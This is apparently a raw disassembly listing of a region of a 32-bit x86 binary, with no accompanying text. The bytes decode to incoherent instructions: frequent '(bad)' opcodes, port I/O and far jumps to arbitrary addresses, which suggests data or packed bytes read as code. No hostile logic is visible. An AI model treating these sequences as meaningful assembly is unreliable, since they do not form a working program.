  42d311:	int    0x5e
  42d313:	mov    ebp,0xf67240bc
  42d318:	into   
  42d319:	les    ebp,FWORD PTR [eax]
  42d31b:	je     0x42d35e
  42d31d:	push   ecx
  42d31e:	not    DWORD PTR [esi-0x124470fd]
  42d324:	test   DWORD PTR [ebx],ebx
  42d326:	das    
  42d327:	add    dl,BYTE PTR [edx]
  42d329:	icebp  
  42d32a:	dec    edi
  42d32b:	mov    edi,DWORD PTR ds:0x4c8d0697
  42d331:	xor    DWORD PTR [eax+0x4b39ea60],0x887b722b
  42d33b:	lahf   
  42d33c:	push   esp
  42d33d:	pop    es
  42d33e:	aam    0x52
  42d340:	push   0x1f
  42d342:	mov    fs,WORD PTR [ecx+0x2a04546c]
  42d348:	jg     0x42d2d8
  42d34a:	data16 mov dl,0x68
  42d34d:	cmc    
  42d34e:	sub    eax,0x71fef510
  42d353:	jl     0x42d313
  42d355:	cdq    
  42d356:	pushf  
  42d357:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d358:	shl    DWORD PTR [edx-0x297f876e],1
  42d35e:	mov    bh,0xfd
  42d360:	inc    ebp
  42d361:	out    dx,al
  42d362:	inc    esi
  42d363:	xchg   ecx,eax
  42d364:	(bad)  
  42d365:	repnz mov al,0x47
  42d368:	push   0x70
  42d36a:	bound  ebx,QWORD PTR [edi]
  42d36c:	call   0xc396:0x64777960
  42d373:	sbb    eax,0x7cddd80e
  42d378:	clc    
  42d379:	push   cs
  42d37a:	out    dx,eax
  42d37b:	push   esp
  42d37c:	pop    esp
  42d37d:	sti    
  42d37e:	mov    al,ds:0x8b10722c
  42d383:	pop    ecx
  42d384:	and    BYTE PTR [eax-0x1],ch
  42d387:	shl    DWORD PTR [eax+eax*4-0x49],cl
  42d38b:	es push 0x4c
  42d38e:	xchg   ecx,eax
  42d38f:	rol    BYTE PTR [eax],cl
	...
  42d3f1:	add    BYTE PTR [eax],al
  42d3f3:	add    cl,al
  42d3f5:	into   
  42d3f6:	arpl   WORD PTR [ecx-0x21044291],bx
  42d3fc:	pop    ecx
  42d3fd:	xchg   esp,eax
  42d3fe:	aaa    
  42d3ff:	pushf  
  42d400:	jno    0x42d480
  42d402:	gs mov esi,0x1e414
  42d408:	add    al,0x1
  42d40a:	add    BYTE PTR [eax],al
  42d40c:	jb     0x42d3e7
  42d40e:	out    0xe0,al
  42d410:	push   eax
  42d411:	nop
  42d412:	icebp  
  42d413:	add    DWORD PTR [eax+0x51],ecx
  42d416:	mov    esi,0x5f17b505
  42d41b:	inc    eax
  42d41c:	outs   dx,BYTE PTR ds:[esi]
  42d41d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d41e:	push   ebp
  42d41f:	retf   0x24bb
  42d422:	int3   
  42d423:	aad    0x54
  42d425:	xor    dh,BYTE PTR [ebp+0x27]
  42d428:	mov    ch,0x5f
  42d42a:	mov    cl,0xaf
  42d42c:	jge    0x42d3f2
  42d42e:	fwait
  42d42f:	mov    eax,ds:0x46bf772b
  42d434:	xor    bl,BYTE PTR [ebp+0x283d7ae0]
  42d43a:	stos   BYTE PTR es:[edi],al
  42d43b:	or     cl,cl
  42d43d:	pusha  
  42d43e:	add    esp,DWORD PTR [edx]
  42d440:	retf   0x3c89
  42d443:	add    eax,0xedc26b66
  42d448:	call   0x94f9e6cd
  42d44d:	mov    bl,0xa7
  42d44f:	emms   
  42d451:	sbb    BYTE PTR [ebx+0x53],ah
  42d454:	adc    bh,BYTE PTR [edi]
  42d456:	mov    WORD PTR [edx-0x24b61dd2],fs
  42d45c:	test   eax,0x31dfd816
  42d461:	lds    ebx,FWORD PTR [ebp+edx*1-0x16]
  42d465:	scas   eax,DWORD PTR es:[edi]
  42d466:	lods   eax,DWORD PTR ds:[esi]
  42d467:	jecxz  0x42d4e0
  42d469:	jecxz  0x42d41f
  42d46b:	xor    al,0xce
  42d46d:	pop    ecx
  42d46e:	dec    esi
  42d46f:	or     al,0xd1
  42d471:	ffree  st(6)
  42d473:	push   es
  42d474:	clc    
  42d475:	bound  ebp,QWORD PTR [ecx+eiz*4]
  42d478:	(bad)  
  42d479:	es mov bl,0xcc
  42d47c:	pushf  
  42d47d:	pusha  
  42d47e:	gs xchg ebp,eax
  42d480:	xor    esi,ebx
  42d482:	jg     0x42d464
  42d484:	sub    al,0x8b
  42d486:	bound  eax,QWORD PTR [ebx+0x71beef70]
  42d48c:	jae    0x42d4d7
  42d48e:	mov    ebp,DWORD PTR [ebx]
  42d490:	push   edi
  42d491:	in     al,0x3
  42d493:	mov    eax,ds:0x6e383685
  42d498:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d499:	pop    es
  42d49a:	jle    0x42d4c5
  42d49c:	mov    WORD PTR [ebp+0x5bb37ecf],es
  42d4a2:	mov    cl,0xec
  42d4a4:	cdq    
  42d4a5:	push   0x2a82c504
  42d4aa:	xor    esi,DWORD PTR [esi]
  42d4ac:	adc    al,0xee
  42d4ae:	stos   BYTE PTR es:[edi],al
  42d4af:	jmp    0x1d1df583
  42d4b4:	sub    bl,dh
  42d4b6:	xor    eax,0x5f9a80b3
  42d4bb:	dec    eax
  42d4bc:	cmp    eax,0x4fe34ce
  42d4c1:	push   0xffffffea
  42d4c3:	dec    edx
  42d4c4:	loope  0x42d4d3
  42d4c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d4c7:	aad    0xa4
  42d4c9:	inc    edi
  42d4ca:	loope  0x42d537
  42d4cc:	push   ds
  42d4cd:	jp     0x42d4cf
  42d4cf:	aaa    
  42d4d0:	int    0xc5
  42d4d2:	jmp    0xaab4:0x4dfa52cc
  42d4d9:	mov    edi,0x1b8a4f7b
  42d4de:	fnstenv [ebx-0x23]
  42d4e1:	and    BYTE PTR [eax],cl
  42d4e3:	shl    BYTE PTR [ecx+0x71],1
  42d4e6:	(bad)  
  42d4e8:	cmp    DWORD PTR [esi+edx*4+0x1bff7fab],0x74
  42d4f0:	lea    edi,[ebx-0x68]
  42d4f3:	inc    ecx
  42d4f4:	test   BYTE PTR [ebp-0x65321316],al
  42d4fa:	ds and BYTE PTR cs:[edx-0x54],dl
  42d4ff:	fidivr DWORD PTR [ecx-0x2b]
  42d502:	adc    dh,0xd3
  42d505:	xchg   esi,eax
  42d506:	call   0xfd4e:0x826d9d58
  42d50d:	push   eax
  42d50e:	dec    esp
  42d50f:	or     al,0x0
	...
  42d571:	add    BYTE PTR [eax],al
  42d573:	add    BYTE PTR [ecx-0x11ac7d0b],bl
  42d579:	ja     0x42d554
  42d57b:	call   FWORD PTR [ebp+0x3e]
  42d57e:	mov    ds:0x13e5a6d5,eax
  42d583:	mov    DWORD PTR [eax],ebx
  42d585:	in     eax,0x1
  42d587:	add    BYTE PTR [ecx+eax*1],al
  42d58a:	add    BYTE PTR [eax],al
  42d58c:	mov    ebp,0x6609ee11
  42d591:	xor    BYTE PTR [edi],dl
  42d593:	jo     0x42d5bb
  42d595:	add    ecx,edi
  42d597:	call   0xefc:0x4ef134c1
  42d59e:	push   esp
  42d59f:	ds jl  0x42d5c3
  42d5a2:	or     al,0x15
  42d5a4:	mov    ecx,0xdfe3a854
  42d5a9:	scas   eax,DWORD PTR es:[edi]
  42d5aa:	sub    DWORD PTR ds:0x4ef081d,edx
  42d5b0:	dec    edi
  42d5b1:	test   eax,0x2a2af3a4
  42d5b6:	adc    BYTE PTR [ebx-0x53],bl
  42d5b9:	add    edi,eax
  42d5bb:	aas    
  42d5bc:	jl     0x42d592
  42d5be:	jmp    0xb278:0xc17c76fa
  42d5c5:	sbb    BYTE PTR [edi-0x407628a7],bh
  42d5cb:	add    esp,DWORD PTR [eax+0x452575de]
  42d5d1:	dec    al
  42d5d3:	out    0x28,eax
  42d5d5:	dec    eax
  42d5d6:	fcomp  DWORD PTR ds:0xf959a8a1
  42d5dc:	jle    0x42d58f
  42d5de:	fmul   DWORD PTR [ebx-0x20]
  42d5e1:	movsx  ebx,BYTE PTR [eax-0x40fcc1ce]
  42d5e8:	jge    0x42d65c
  42d5ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d5eb:	(bad)  
  42d5ec:	mov    dh,BYTE PTR [edi-0x61]
  42d5ef:	mov    esi,0x96cf8780
  42d5f4:	test   esi,ebp
  42d5f6:	dec    edi
  42d5f7:	mov    bl,0x45
  42d5f9:	mov    WORD PTR [ecx+0x57b2da98],gs
  42d5ff:	out    0xcf,al
  42d601:	scas   al,BYTE PTR es:[edi]
  42d602:	scas   al,BYTE PTR es:[edi]
  42d603:	sub    al,BYTE PTR [edx+eiz*2]
  42d606:	int3   
  42d607:	call   0xe5c4f11d
  42d60c:	inc    esp
  42d60d:	lods   al,BYTE PTR ds:[esi]
  42d60e:	sub    ecx,esp
  42d610:	stos   BYTE PTR es:[edi],al
  42d611:	fnstenv [esi-0x271b5c79]
  42d617:	dec    eax
  42d618:	xchg   BYTE PTR ds:0x22c0de55,dh
  42d61e:	push   ds
  42d61f:	push   edi
  42d620:	dec    edi
  42d621:	lods   al,BYTE PTR ds:[esi]
  42d622:	xor    edi,DWORD PTR [ecx+0x4142935]
  42d628:	xchg   esp,eax
  42d629:	push   ebx
  42d62a:	dec    ebp
  42d62b:	iret   
  42d62c:	xor    esp,DWORD PTR [esi-0x8]
  42d62f:	outs   dx,DWORD PTR ds:[esi]
  42d630:	sub    al,0xcc
  42d632:	mov    cl,0x61
  42d634:	jnp    0x42d65f
  42d636:	xlat   BYTE PTR ds:[ebx]
  42d637:	jp     0x42d65f
  42d639:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d63a:	mov    WORD PTR [ecx-0x70],ss
  42d63d:	mov    eax,ds:0x5c7da9f4
  42d642:	iret   
  42d643:	and    ch,ch
  42d645:	sub    eax,0x56a0c006
  42d64a:	sbb    BYTE PTR [edi+ecx*8],ch
  42d64d:	jmp    ebp
  42d64f:	jmp    0x6396:0x25224f5f
  42d656:	out    dx,eax
  42d657:	xor    DWORD PTR [esi-0x1193facd],ecx
  42d65d:	push   cs
  42d65e:	fsubr  QWORD PTR [ecx]
  42d660:	mov    bh,0xc7
  42d662:	ret    0xded9
  42d665:	mov    ds:0xdb52362,al
  42d66a:	shl    BYTE PTR [esi-0x68],0x25
  42d66e:	push   cs
  42d66f:	shr    BYTE PTR [ebp+ecx*8-0x8e43d80],cl
  42d676:	enter  0x55d3,0xcc
  42d67a:	mov    ch,0xe0
  42d67c:	imul   DWORD PTR [ebx-0x3a311728]
  42d682:	and    bh,BYTE PTR gs:[edx-0x470ffffd]
  42d689:	test   ch,bl
  42d68b:	mov    ecx,0x9235e679
	...
  42d6f4:	repz add esp,DWORD PTR [eax]
  42d6f7:	(bad)  
  42d6f8:	lock scas eax,DWORD PTR es:[edi]
  42d6fa:	(bad)  
  42d6fb:	jg     0x42d67e
  42d6fd:	in     al,0x2c
  42d6ff:	and    al,0x13
  42d701:	mov    ah,0x85
  42d703:	in     al,0x1c
  42d705:	out    0x1,al
  42d707:	add    BYTE PTR [ecx+eax*1],al
  42d70a:	add    BYTE PTR [eax],al
  42d70c:	ss pop eax
  42d70e:	fisubr WORD PTR [edx]
  42d710:	mov    ah,0xa5
  42d712:	loope  0x42d694
  42d714:	nop
  42d715:	push   ds
  42d716:	mov    al,0x94
  42d718:	xchg   ebp,eax
  42d719:	(bad)  
  42d71a:	mov    ebx,0xc253d6b6
  42d71f:	mov    esi,0x4c7a64db
  42d724:	sub    BYTE PTR [ebx+0x55],dl
  42d727:	adc    al,0x59
  42d729:	out    0xf,al
  42d72b:	push   esp
  42d72c:	jb     0x42d758
  42d72e:	jb     0x42d79d
  42d730:	fs push edi
  42d732:	dec    edi
  42d733:	inc    ebp
  42d734:	inc    ebp
  42d735:	mov    cl,BYTE PTR [ecx-0x29132a9e]
  42d73b:	mov    cl,0xa9
  42d73d:	xchg   ecx,eax
  42d73e:	outs   dx,DWORD PTR ds:[esi]
  42d73f:	push   ss
  42d740:	add    DWORD PTR ds:0xd7f0da83,0xe8a5cb57
  42d74a:	push   ebp
  42d74b:	adc    BYTE PTR [ecx+0x5608316f],cl
  42d751:	push   0xffffff8e
  42d753:	xchg   ebp,eax
  42d754:	cmp    ebx,DWORD PTR [esi+edx*4+0x2d38ec5a]
  42d75b:	cs jbe 0x42d785
  42d75e:	(bad)  
  42d75f:	push   esi
  42d760:	push   ecx
  42d761:	ret    0x5d93
  42d764:	scas   al,BYTE PTR es:[edi]
  42d765:	pop    ebp
  42d766:	mov    ebx,DWORD PTR [ebp+0x5a]
  42d769:	(bad)  
  42d76a:	fcomp  DWORD PTR [edx+eax*4]
  42d76d:	loope  0x42d7d7
  42d76f:	sbb    al,0x60
  42d771:	(bad)  
  42d772:	lea    ebp,[edx]
  42d774:	xchg   BYTE PTR [edx],cl
  42d776:	(bad)  
  42d777:	or     eax,0x4a1381c9
  42d77c:	or     ebp,DWORD PTR [edx+0x3055250]
  42d782:	cmp    al,dh
  42d784:	mov    dl,0x6c
  42d786:	outs   dx,DWORD PTR ds:[esi]
  42d787:	jp     0x42d71b
  42d789:	imul   ebx,DWORD PTR [esi],0x5ed506ce
  42d78f:	arpl   cx,si
  42d791:	fdiv   QWORD PTR [esi-0x39d6b86e]
  42d797:	call   0xef59c3ba
  42d79c:	pop    es
  42d79d:	sub    ah,BYTE PTR [esp+esi*2]
  42d7a0:	xor    DWORD PTR [ebx+0x4e],0x6e
  42d7a4:	push   ds
  42d7a5:	enter  0x4450,0x76
  42d7a9:	lods   al,BYTE PTR ds:[esi]
  42d7aa:	cwde   
  42d7ab:	aad    0xb4
  42d7ad:	or     al,0xa
  42d7af:	jo     0x42d82c
  42d7b1:	fiadd  DWORD PTR [ecx+0x68acab84]
  42d7b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d7b8:	sub    BYTE PTR [edi+0x25c66863],ah
  42d7be:	mov    edi,0xe629cb10
  42d7c3:	ficom  DWORD PTR [eax+0x56919ba6]
  42d7c9:	addr16 sub eax,0x5b752d75
  42d7cf:	adc    DWORD PTR [eax-0x1c4dd331],0x5df73374
  42d7d9:	ins    DWORD PTR es:[edi],dx
  42d7da:	out    dx,eax
  42d7db:	out    0x99,al
  42d7dd:	jmp    0x52a4:0xdf2de9a5
  42d7e4:	xchg   ecx,eax
  42d7e5:	adc    BYTE PTR [ecx+0x344fdd02],dl
  42d7eb:	sbb    ebp,eax
  42d7ed:	and    cl,BYTE PTR [edx-0x7ebea6fd]
  42d7f3:	jb     0x42d819
  42d7f5:	mov    eax,0x318e26b8
  42d7fa:	div    DWORD PTR [edx]
  42d7fc:	mul    BYTE PTR [edi+0x657c7123]
  42d802:	jecxz  0x42d882
  42d804:	xchg   edx,eax
  42d805:	ror    BYTE PTR [edi-0x22],1
  42d808:	xchg   ebx,eax
  42d809:	sbb    ecx,DWORD PTR [edi+0x74]
  42d80c:	lds    ebp,FWORD PTR [esi+0x2521]
	...
  42d872:	add    BYTE PTR [eax],al
  42d874:	xchg   esi,eax
  42d875:	fwait
  42d876:	cwde   
  42d877:	pop    edi
  42d878:	popf   
  42d879:	pop    edi
  42d87a:	xlat   BYTE PTR ds:[ebx]
  42d87b:	fistp  DWORD PTR ds:0x89c6961a
  42d881:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d882:	sbb    ah,BYTE PTR [ebx+0x20]
  42d885:	out    0x1,eax
  42d887:	add    BYTE PTR [ecx+eax*1],al
  42d88a:	add    BYTE PTR [eax],al
  42d88c:	xchg   ebx,eax
  42d88d:	sar    BYTE PTR [edi-0x3b],0xa7
  42d891:	mov    al,ds:0x58c52acf
  42d896:	scas   al,BYTE PTR es:[edi]
  42d897:	data16 mov BYTE PTR [ebx+0x7cf9355],dh
  42d89e:	or     ch,BYTE PTR [ebp-0x354f9695]
  42d8a4:	xor    ebp,edx
  42d8a6:	(bad)  
  42d8a8:	fs adc dh,bl
  42d8ab:	xor    al,0x27
  42d8ad:	addr16 pop esp
  42d8af:	mov    ebx,0xb78266d2
  42d8b4:	inc    ebx
  42d8b5:	(bad)
  42d8b9:	retf   0xf8eb
  42d8bc:	sbb    cl,bh
  42d8be:	mov    ah,0xf9
  42d8c0:	rcl    BYTE PTR [ecx+0x7f],cl
  42d8c3:	int    0x92
  42d8c5:	sbb    al,0x8a
  42d8c7:	xchg   esp,eax
  42d8c8:	push   edx
  42d8c9:	dec    esp
  42d8ca:	stos   BYTE PTR es:[edi],al
  42d8cb:	push   0x78
  42d8cd:	add    ebp,DWORD PTR [eax-0xa7cd2d]
  42d8d3:	js     0x42d867
  42d8d5:	arpl   WORD PTR [edi],cx
  42d8d7:	mov    al,ds:0x8dc1dba7
  42d8dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d8dd:	push   esi
  42d8de:	or     ah,BYTE PTR [ebp-0x23]
  42d8e1:	call   0xb0a1:0x5620a7e4
  42d8e8:	ds mov al,0x29
  42d8eb:	(bad)  
  42d8ec:	fcom   st(7)
  42d8ee:	cmp    ah,ah
  42d8f0:	xor    dh,BYTE PTR [ebp-0x6e52f19e]
  42d8f6:	adc    bl,BYTE PTR [ecx-0x33339d00]
  42d8fc:	inc    esi
  42d8fd:	dec    ebp
  42d8fe:	imul   edx,esi,0x95d090e
  42d904:	clc    
  42d905:	cwde   
  42d906:	mov    eax,ds:0x28294a5e
  42d90b:	dec    ebx
  42d90c:	jle    0x42d8d1
  42d90e:	aad    0x2
  42d910:	jecxz  0x42d8e1
  42d912:	cs add eax,0x31610050
  42d918:	cmc    
  42d919:	ja     0x42d960
  42d91b:	test   eax,0x9cde9b8
  42d920:	mov    dl,0x96
  42d922:	bnd ret 0x98bb
  42d926:	mov    ch,0xa
  42d928:	aaa    
  42d929:	push   0x2f7af34a
  42d92e:	push   0x55
  42d930:	push   edi
  42d931:	(bad)  
  42d932:	pushf  
  42d933:	mov    esi,0x22c6acbc
  42d938:	out    dx,al
  42d939:	push   cs
  42d93a:	mov    ds:0xd83348df,eax
  42d93f:	inc    ebp
  42d940:	and    eax,0x64c6c8c7
  42d945:	push   edx
  42d946:	xor    al,0xee
  42d948:	jecxz  0x42d91c
  42d94a:	and    bl,ah
  42d94c:	xor    cl,bh
  42d94e:	add    BYTE PTR [eax+ebx*2],ch
  42d951:	call   0xea7de50b
  42d956:	rol    BYTE PTR ds:0x22c0cec,0x19
  42d95d:	outs   dx,DWORD PTR ds:[esi]
  42d95e:	hlt    
  42d95f:	int    0x35
  42d961:	retf   0x9f5e
  42d964:	xchg   edx,ecx
  42d966:	repnz pushf 
  42d968:	lds    eax,FWORD PTR [ebx]
  42d96a:	lea    edx,[edx]
  42d96c:	mov    al,dh
  42d96e:	loope  0x42d906
  42d970:	dec    ebp
  42d971:	cli    
  42d972:	cmp    al,0x65
  42d974:	inc    edi
  42d975:	out    0x9c,al
  42d977:	mov    al,ds:0xfbda7f52
  42d97c:	adc    DWORD PTR [esi+0x3197d0f9],ebx
  42d982:	icebp  
  42d983:	push   ss
  42d984:	mov    ch,0x11
  42d986:	jmp    0x62ca:0x27976e5d
  42d98d:	jge    0x42d9c1
  42d98f:	aam    0x0
	...
  42d9f1:	add    BYTE PTR [eax],al
  42d9f3:	add    cl,bh
  42d9f5:	mov    cl,0x70
  42d9f7:	dec    eax
  42d9f8:	js     0x42d9c3
  42d9fa:	stc    
  42d9fb:	mov    cl,0xbf
  42d9fd:	dec    edi
  42d9fe:	int    0xe1
  42da00:	push   ecx
  42da01:	and    bl,BYTE PTR [edi+0x1e8248d]
  42da07:	add    BYTE PTR [ecx+eax*1],al
  42da0a:	add    BYTE PTR [eax],al
  42da0c:	test   eax,0xa21bdbf9
  42da11:	jnp    0x42d9dd
  42da13:	adc    BYTE PTR [eax-0x42],dl
  42da16:	sub    eax,0xc74ab83d
  42da1b:	mov    ecx,0xbc6fa179
  42da20:	add    BYTE PTR [eax+0x65d4004b],bl
  42da26:	inc    esi
  42da27:	jp     0x9edf735c
  42da2d:	jbe    0x42d9e4
  42da2f:	fst    st(5)
  42da31:	push   edi
  42da32:	xchg   BYTE PTR [edx-0x7e04f53b],cl
  42da38:	add    eax,0xa8019063
  42da3d:	jecxz  0x42d9e4
  42da3f:	sbb    ebx,ebx
  42da41:	pop    edi
  42da42:	es xchg edi,eax
  42da44:	rcr    DWORD PTR [esi],cl
  42da46:	and    ebx,0x54
  42da49:	(bad)  
  42da4a:	xlat   BYTE PTR ds:[ebx]
  42da4b:	add    BYTE PTR [ebp-0x58],al
  42da4e:	fsub   st(4),st
  42da50:	sub    dh,bh
  42da52:	pop    es
  42da53:	jno    0x42da83
  42da55:	jle    0x42d9e0
  42da57:	jns    0x42da6c
  42da59:	sub    DWORD PTR [edx+edx*2],ecx
  42da5c:	shl    BYTE PTR [edx],1
  42da5e:	pop    ss
  42da5f:	cs mov bl,0x54
  42da62:	ins    DWORD PTR es:[edi],dx
  42da63:	rcr    DWORD PTR [esi],cl
  42da65:	aad    0x2d
  42da67:	packssdw mm3,QWORD PTR [edi-0x9]
  42da6b:	mov    ds:0x9411b026,al
  42da70:	paddb  mm4,QWORD PTR [esi+0x6]
  42da74:	das    
  42da75:	icebp  
  42da76:	and    esi,0x9ca4f16f
  42da7c:	mov    ah,0xcf
  42da7e:	ror    DWORD PTR [ebx],cl
  42da80:	pop    es
  42da81:	lds    ebp,FWORD PTR ds:[ecx+0x5c]
  42da85:	pusha  
  42da86:	dec    esi
  42da87:	inc    eax
  42da88:	push   es
  42da89:	enter  0x7de1,0xb3
  42da8d:	pop    ecx
  42da8e:	clc    
  42da8f:	call   0x4d3d:0x56991059
  42da96:	push   edi
  42da97:	pop    esi
  42da98:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42da99:	in     eax,0x4d
  42da9b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42da9c:	mov    ecx,0x85b86fb0
  42daa1:	sti    
  42daa2:	(bad)  [esi+0x5d673b3c]
  42daa8:	jb     0x42da31
  42daaa:	test   al,0xaf
  42daac:	fcomp  DWORD PTR [ecx-0x76afd386]
  42dab2:	push   es
  42dab3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42dab4:	imul   dh
  42dab6:	sahf   
  42dab7:	pop    ebx
  42dab8:	arpl   WORD PTR [ecx-0x6aa7d24d],sp
  42dabe:	jno    0x42dac0
  42dac0:	stos   BYTE PTR es:[edi],al
  42dac1:	sub    BYTE PTR [esi-0x24],cl
  42dac4:	mov    esp,DWORD PTR [edx]
  42dac6:	mov    DWORD PTR [edi+0x5311e64],ebx
  42dacc:	in     eax,0x5
  42dace:	es add al,0x65
  42dad1:	cdq    
  42dad2:	sub    ah,BYTE PTR [ebp+0x7e]
  42dad5:	test   bh,ch
  42dad7:	mov    ecx,0x87dc3669
  42dadc:	repz rcr DWORD PTR [edx],cl
  42dadf:	hlt    
  42dae0:	sub    ch,BYTE PTR [ecx+0x553c08be]
  42dae6:	lods   eax,DWORD PTR ds:[esi]
  42dae7:	int    0x76
  42dae9:	scas   eax,DWORD PTR es:[edi]
  42daea:	dec    esi
  42daeb:	fwait
  42daec:	(bad)  
  42daed:	shl    DWORD PTR [eax],0xdd
  42daf0:	mov    eax,ds:0x6c97a6a5
  42daf5:	shl    BYTE PTR [edx+0x53],cl
  42daf8:	nop
  42daf9:	gs push ecx
  42dafb:	cmp    ecx,DWORD PTR [edi-0xb33aca3]
  42db01:	sub    al,0x67
  42db03:	jecxz  0x42dadb
  42db05:	push   edi
  42db06:	mov    edi,DWORD PTR [ebx+0x2b]
  42db09:	(bad)  
  42db0a:	xchg   esi,eax
  42db0b:	xor    dh,BYTE PTR [ebp+0x3c7d9c]
	...
  42db71:	add    BYTE PTR [eax],al
  42db73:	add    BYTE PTR [eax-0x2093e086],dh
  42db79:	ins    DWORD PTR es:[edi],dx
  42db7a:	repz (bad) 
  42db7c:	fwait
  42db7d:	jns    0x42db1a
  42db7f:	jns    0x42db80
  42db81:	pop    ebx
  42db82:	fiadd  DWORD PTR [edx+0x28]
  42db85:	jmp    0x146db8b
  42db8a:	add    BYTE PTR [eax],al
  42db8c:	gs pusha 
  42db8e:	or     al,0x35
  42db90:	jmp    0x42db9e
  42db92:	dec    eax
  42db93:	nop
  42db94:	mov    ds:0xe86f9b85,al
  42db99:	stos   BYTE PTR es:[edi],al
  42db9a:	nop
  42db9b:	adc    esp,ebp
  42db9d:	mov    ds:0xe72c437e,al
  42dba2:	add    DWORD PTR [edx-0x270ca173],esi
  42dba8:	mov    ds:0x521f2b3c,eax
  42dbad:	xchg   ebp,eax
  42dbae:	loopne 0x42dbfe
  42dbb0:	dec    ebx
  42dbb1:	(bad)  
  42dbb2:	mov    ebx,0xba084712
  42dbb7:	gs cmc 
  42dbb9:	test   eax,0xfb9a589e
  42dbbe:	call   0x4868:0xde78e643
  42dbc5:	and    al,0xf2
  42dbc7:	ins    DWORD PTR es:[edi],dx
  42dbc8:	add    ah,BYTE PTR [edx-0x78]
  42dbcb:	stos   BYTE PTR es:[edi],al
  42dbcc:	dec    edi
  42dbcd:	push   0x6f1c4c2
  42dbd2:	scas   al,BYTE PTR es:[edi]
  42dbd3:	jo     0x42dc1c
  42dbd5:	pop    esi
  42dbd6:	mov    edx,0x6bbf0db9
  42dbdb:	mov    WORD PTR [ebx+0x1a],?
  42dbde:	push   esp
  42dbdf:	add    ecx,DWORD PTR ds:0x9d40
  42dbe4:	clc    
  42dbe5:	mov    al,0x63
  42dbe7:	popf   
  42dbe8:	loope  0x42dc4e
  42dbea:	push   edi
  42dbeb:	hlt    
  42dbec:	pand   mm0,QWORD PTR [eax+ebx*2+0x3b]
  42dbf1:	cli    
  42dbf2:	or     al,BYTE PTR [edi+0xea64a6b]
  42dbf8:	into   
  42dbf9:	lods   al,BYTE PTR ds:[esi]
  42dbfa:	sub    BYTE PTR [edi+eax*2],bl
  42dbfd:	jne    0x42dc6a
  42dbff:	enter  0x5986,0x94
  42dc03:	sbb    eax,edi
  42dc05:	mov    ah,0x6
  42dc07:	dec    edi
  42dc08:	call   edx
  42dc0a:	cli    
  42dc0b:	fst    QWORD PTR [ebx-0x7]
  42dc0e:	push   eax
  42dc0f:	aaa    
  42dc10:	xchg   ch,cl
  42dc12:	dec    BYTE PTR [eax]
  42dc14:	or     al,0x52
  42dc16:	inc    ecx
  42dc17:	and    ebx,DWORD PTR [edx]
  42dc19:	dec    ebp
  42dc1a:	jnp    0x42dc88
  42dc1c:	mov    ss,WORD PTR [edi]
  42dc1e:	fwait
  42dc1f:	(bad)  
  42dc20:	outs   dx,DWORD PTR ds:[esi]
  42dc21:	pop    ss
  42dc22:	or     eax,0xf2e5fdbe
  42dc27:	jb     0x42dbbf
  42dc29:	fwait
  42dc2a:	outs   dx,BYTE PTR ds:[esi]
  42dc2b:	mov    edx,0x35e4ae81
  42dc30:	aaa    
  42dc31:	retf   
  42dc32:	or     eax,0x75a139b3
  42dc37:	jp     0x42dc18
  42dc39:	es fwait
  42dc3b:	pop    eax
  42dc3c:	lods   eax,DWORD PTR ds:[esi]
  42dc3d:	repnz or ah,BYTE PTR [ebx+0x7d17ac25]
  42dc44:	test   DWORD PTR [ecx],0x3f0bcb50
  42dc4a:	push   cs
  42dc4b:	mov    bh,0x8e
  42dc4d:	cwde   
  42dc4e:	inc    edx
  42dc4f:	mov    eax,0xeda35a5f
  42dc54:	dec    ebp
  42dc55:	and    BYTE PTR [ebp+0x4594a84e],ah
  42dc5b:	ret    
  42dc5c:	jge    0x42dc8b
  42dc5e:	adc    dl,BYTE PTR [ebx+0x59e85a5b]
  42dc64:	out    0xdc,al
  42dc66:	push   edi
  42dc67:	loope  0x42dc7b
  42dc69:	sahf   
  42dc6a:	pop    ds
  42dc6b:	scas   al,BYTE PTR es:[edi]
  42dc6c:	je     0x42dcb3
  42dc6e:	pusha  
  42dc6f:	mov    al,ds:0x91ea20d8
  42dc74:	xlat   BYTE PTR ds:[ebx]
  42dc75:	mov    ah,0x3c
  42dc77:	shl    ecx,1
  42dc79:	jae    0x42dcd0
  42dc7b:	cli    
  42dc7c:	mov    ch,bl
  42dc7e:	sub    BYTE PTR [ebx+0x76],0xfa
  42dc82:	jmp    0xd4133f96
  42dc87:	add    eax,0x77d4f1c7
  42dc8c:	jne    0x42dcba
  42dc8e:	(bad)  
  42dc8f:	test   BYTE PTR [eax],0x0
	...
  42dcf2:	add    BYTE PTR [eax],al
  42dcf4:	cmp    DWORD PTR [edi-0x2010f093],esi
  42dcfa:	jnp    0x42dcb3
  42dcfc:	adc    BYTE PTR [eax],ch
  42dcfe:	jne    0x42dce6
  42dd00:	repz les esp,FWORD PTR [edx-0x4b]
  42dd04:	sub    al,0xea
  42dd06:	add    DWORD PTR [eax],eax
  42dd08:	add    al,0x1
  42dd0a:	add    BYTE PTR [eax],al
  42dd0c:	scas   al,BYTE PTR es:[edi]
  42dd0d:	push   ecx
  42dd0e:	jne    0x42dcae
  42dd10:	sub    edi,DWORD PTR [edx]
  42dd12:	outs   dx,DWORD PTR ds:[esi]
  42dd13:	popf   
  42dd14:	in     eax,dx
  42dd15:	lea    ebx,[ebx]
  42dd17:	add    eax,0xdd6dabd4
  42dd1c:	dec    esi
  42dd1d:	xchg   esp,eax
  42dd1e:	pop    esp
  42dd1f:	xchg   ecx,eax
  42dd20:	aad    0x2e
  42dd22:	cmp    esp,DWORD PTR [ebx-0x3ed0560c]
  42dd28:	(bad)
  42dd2b:	(bad)  
  42dd2c:	xor    dl,BYTE PTR [esi-0x3f0b886e]
  42dd32:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42dd33:	xchg   esi,eax
  42dd34:	push   esi
  42dd35:	push   0x65
